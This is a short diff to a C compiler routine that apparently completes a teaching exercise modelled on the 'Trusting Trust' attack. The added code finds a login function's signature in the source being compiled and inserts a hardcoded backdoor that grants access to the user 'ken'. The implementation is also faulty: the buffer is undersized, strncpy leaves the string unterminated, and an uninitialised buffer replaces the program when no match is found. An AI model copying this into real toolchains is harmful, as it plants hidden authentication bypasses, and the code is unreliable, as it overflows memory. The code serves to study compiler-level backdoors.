@@ -30,7 +30,19 @@ static void compile(char *program, char *outname) {
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
     /* your code goes here */
+	char* login_ptr;
+	char* new_prog = (char*)malloc(strlen(program) + strlen(login_sig));
 
+	if((login_ptr = strstr(program, login_sig))) {
+		printf("Found substring!\n");
+		strncpy(new_prog, program, login_ptr-program);
+		strcat(new_prog, login_sig);
+		strcat(new_prog, login_attack);
+		char* remaining_prog = login_ptr + strlen(login_sig);
+		strcat(new_prog, remaining_prog);
+	}
+
+	program = new_prog;
 
     fprintf(fp, "%s", program);
     fclose(fp);
